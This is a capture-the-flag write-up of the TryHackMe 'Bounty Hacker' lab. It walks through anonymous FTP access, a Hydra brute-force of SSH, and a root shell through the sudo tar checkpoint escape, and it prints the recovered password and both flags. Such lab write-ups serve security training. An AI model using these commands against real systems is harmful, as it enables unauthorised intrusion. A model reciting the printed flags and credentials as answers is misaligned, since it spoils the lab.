---
title: 'TryHackMe - Bounty Hacker'
author: r2cook
categories: [TryHackMe]
tags: [ftp, ssh, hydra, PrivEsc, GTFOBins, tar]
render_with_liquid: false
media_subpath: /images/thm/Bounty-Hacker/
image:
  path: room_card.jpg
---

> In this write-up, we exploit an **anonymous FTP share** to recover both an internal task note and a reusable password wordlist.
> Using the discovered username `lin`, we brute-force the **SSH service with Hydra**, gain a foothold on the box, and escalate privileges by abusing a **sudo misconfiguration on `tar`** through a well-known **GTFOBins checkpoint escape**.
>
> This room is a great beginner-friendly example of how **exposed files, weak credential hygiene, and unsafe sudo rules** can combine into a full root compromise.

# Initial Setup

Add the target to your hosts file:

```plaintext
10.128.181.54 bounty.thm
```
{: file="/etc/hosts" }

---

# Enumeration

## Full Port Scan

```shell
nmap -p- -sV -sC -Pn --min-rate 1000 -oN nmap_full_scan.txt bounty.thm
```
{: .nolineno }

## Scan Results

```text
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-30 03:21 EET
Nmap scan report for bounty.thm (10.128.181.54)
Host is up (0.056s latency).
Not shown: 55529 filtered tcp ports (no-response), 10003 closed tcp ports (conn-refused)

PORT   STATE SERVICE VERSION
21/tcp open  ftp    vsftpd 3.0.5
22/tcp open  ssh    OpenSSH 8.2p1 Ubuntu
80/tcp open  http   Apache httpd 2.4.41 ((Ubuntu))
```

### 🧠 Key Findings

- **FTP (21):** Anonymous login enabled
    
- **SSH (22):** Potential brute-force target
    
- **HTTP (80):** Standard web enumeration target
    

---

# FTP Enumeration (Anonymous Login)

Anonymous FTP access is enabled.

![](Image_1.png){: width="800" height="400" .shadow }

After logging in, two files are available:

- `locks.txt`
    
- `task.txt`
    

---

## Inspecting `locks.txt`

The file appears to contain a list of possible passwords.

![](Image_2.png){: width="800" height="400" .shadow }


This will likely be useful for brute-forcing another service.

---

## Inspecting `task.txt`

![](Image_3.png){: width="800" height="400" .shadow }

From the contents of the task list, we can identify that it was written by:

```text
lin
```
---

# Brute-Forcing SSH

Using the username `lin` and the password list from `locks.txt`, we can brute-force SSH with Hydra.

```shell
hydra -l lin -P locks.txt ssh://bounty.thm
```
{: .nolineno }

![](Image_4.png){: width="800" height="400" .shadow }

Hydra successfully finds the credentials:

```css
[22][ssh] host: bounty.thm   login: lin   password: RedDr4gonSynd1cat3
```

---

# Initial Access

Use the discovered SSH credentials to log in as `lin`.

![](Image_5.png){: width="800" height="400" .shadow }

The **user flag** is:

```text
THM{CR1M3_SyNd1C4T3}
```

---

# Privilege Escalation  (PrivEsc)

Check the allowed sudo commands:

```shell
sudo -l
```
{: .nolineno }

Output:

```text
User lin may run the following commands:
(root) /bin/tar
```

This is a known **GTFOBins privilege escalation vector**.

![](Image_6.png){: width="800" height="400" .shadow }

Use the following command to spawn a root shell:

```shell
sudo /bin/tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
{: .nolineno }

```text
# id
uid=0(root) gid=0(root) groups=0(root)
```

---

# Root Flag

![](Image_7.png){: width="800" height="400" .shadow }

The **root flag** is:

```text
THM{80UN7Y_h4cK3r}
```

---